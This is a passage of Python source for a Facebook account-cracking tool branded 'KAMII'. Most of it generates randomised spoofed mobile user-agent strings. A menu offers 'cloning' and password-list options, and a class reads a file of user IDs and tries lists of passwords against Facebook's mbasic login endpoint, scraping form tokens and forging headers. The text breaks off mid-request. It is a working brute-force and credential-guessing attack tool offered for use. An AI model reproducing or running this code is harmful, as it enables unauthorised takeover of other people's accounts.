    l='Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SHARK KTUS-H0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['6002 Build/PPR1.180610.011; wv'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (iPhone;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['CPU iPhone OS 16_0 like Mac OS X)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Infinix X688B'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Series40;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Nokia2000/11.95;'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='S40OviBrowser/2.2.0.0.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 8.1.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['ASUS_Z01QD'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/72.0.3626.76 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['PortalTV'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/85.0.4183.120 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['PortalTV Build/PKQ1.190408.001; wv'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 5.1;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['GT-810 Build/LMY47I'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/66.0.3359.106 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; U; Android 2.2;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Desire_A8181 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' 4.0 Mobile Safari/533.1'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (SMART-TV;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux; Tizen 2.4.0)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/538.1'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; U; Android 2.3.6;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; GT-S5839i Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=' GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='4.0 Mobile Safari/534.30'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 4.0.4;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='LT30p Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='7.0.A.3.195) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='18.0.1025.166 Mobile Safari/535.19'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['CPH1969 Build/RP1A.200720.011; wv)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36 WpsMoffice/16.6/arm64-v8a/1347'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

    aa='Mozilla/5.0 (Linux; Android 7.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 4 Build/NRD90M)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/63.0.3239.111 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 9 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 9 Pro)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['ASUS_I005DA)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/102.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Vivo Y91C)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/98.0.4711.185 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['M2012K11AG Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Vivo Y91C)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/97.0.4740.200 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 8.1.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['CPH1909 Build/O11019 )'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        

def sz__love(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)

os.system('clear')
logo=("""                   



\x1b[1;92m   db   dD  .d8b.  .88b  d88. d888888b d888888b 
\x1b[1;97m   88 ,8P' d8' `8b 88'YbdP`88   `88'     `88'   
\x1b[1;93m   88,8P   88ooo88 88  88  88    88       88    
\x1b[1;96m   88`8b   88~~~88 88  88  88    88       88    
\x1b[1;94m   88 `88. 88   88 88  88  88   .88.     .88.   
\x1b[1;92m   YP   YD YP   YP YP  YP  YP Y888888P Y888888P 
                      
\033[1;33m-------------------------------------------------
\033[37mOwner   :             Kamran Haider
\033[37mFacebook:             Kamran Haider
\033[37mVesion  :             0.5
\033[1;33m-------------------------------------------------""")
hh = ['[FBAN/FB4A;FBAV/2110.0.43.112;FBBV/14493238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/FBBD/myPhone;FBPN/web.facebook.com;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/2110.0.43.112;FBBV/144693253;FBM/{density=3.0,width=1080,height=1920};FBLC/en_usFBRV/145297323;FBCR/Bot Mobile;FBMF/samsung;FBBD/samsung;FBPN/web.facebook.com;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.00.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/web.facebook.com;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/;FBCA/armeabi-v7a;armeabi;]','[FBAN/FB4A;FBAV/304.00.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/22210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/web.facebook.com;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]']

linex = print('\033[1;33m-------------------------------------------------')
def line():
     print('\033[1;33m-------------------------------------------------')
def clear():
    os.system('clear')
    print(logo)

def menu():
    os.system('clear')
    print(logo)
    ipm ={'origin':"bd"}
    todz = ''
    IP = ipm['origin']
    print('\033[1;32m[1] File Cloning Menu')
    print('\033[1;32m[2] Random Cloning Pak')
    print('\033[1;32m[3] Create File Menu')
    print('\033[1;32m[4] 2F And Pass Change')
    print('\033[1;32m[5] Remove Double Links')
    print('\033[1;32m[6] Seperate Links From File')
    print('\033[1;32m[7] Cut Links From Used File')
    print('\033[1;32m[8] Se Working Password List')
    print('\033[1;32m[S] Contact Social Accounts')
    print('\033[1;32m[W] Join Whatsapp Grorup')
    print('\033[1;32m[F] Join Facebook Group')
    print('\033[1;33m-------------------------------------------------')
    kb = input('\033[1;36m [+] Choose option : ')
    if kb =='1':
        methods()
    elif kb =='2':
        rndom()
    elif kb =='3':
        ext_menu()
    elif kb =='4':
         f2()
    elif kb =='5':
        double()
    elif kb =='6':
        separate()
    elif kb =='7':
        cutrs()
    elif kb =='8':
        psd()
    elif kb =='s' or 'S':
        socal()
    elif kb =='w' or 'W':
        wtjoin()
    elif kb =='f' or 'F':
        grp() 
    else:
        menu()

def methods():
    global method
    os.system('clear')
    print(logo)
    print('\033[1;32m[1] Method 1 ')
    print('\033[1;32m[2] Method 2 ')
    print('\033[1;32m[3] Method 3 ')
    print('\033[1;32m[4] Method 4 ')
    line()
    chb = input('\033[1;36m [*] Choose Option: ')
    if chb =='1':
        method.append('m1')
        __xxx__().kamix(id)
    elif chb =='2':
        method.append('m2')
        __xxx__().kamix(id)
    elif chb =='3':
        method.append('m3')
        __xxx__().kamix(id)
    elif chb =='4':
        method.append('m4')
        crack_main().crack()
    else:
        print('Choose Correct Method')
        menu()

class __xxx__:
    def __init__(self):
        self.id = []
    def kamix(self,id):
        global method
        os.system('clear')
        print(logo)
        print('\033[1;31mEnter File Name For Example')
        print('\033[1;36m/sdcard/filename.txt')
        line()
        try:
            self.cnt = input('\033[1;36mEnter File Name : ')
            self.id = open(self.cnt).read().splitlines()
            ___worldwide___ = ('y')
            if ___worldwide___ in ('yes','Yes','Y', 'y'):
                self.__pler__()
            else:
                print(' [+] Choose Correct One');
            menu()
        except FileNotFoundError:
            print('File Not Found ')
    def methodD(self, user, __chi__, cebok):
        global oks,cps,loop
        sys.stdout.write(f"\r \x1b[1;97m[KAMII-M1] {loop}|{len(self.id)} OK/CP {len(ok)}/{len(cp)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                session=requests.Session()
                sua = random.choice(ugen)
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":user,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com',
                                        'method': 'GET',
                                        'path': '/login/?next&ref=dbl&fl&login_from_aymh=1',
                                        'scheme': 'https',
                                        'viewport-width': '980',
                                        'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfdDib0ftFz6o6gbNKyoJWy-s3IMwutty0Wmw7JVSoqpNYoArhpuMB9Qk9H10grCiK791cqf81CSu7TuJtCkE-R21jHkPvtz6AbV4D2sL21OVw&smuh=57091&lh=Ac-QcYLQ9AJqwn8P7AU&wtsid=rdr_0LpgRrCzak7y8aC7p&refid=7&ref=wizard&ref_component=mbasic_footer&_rdr',
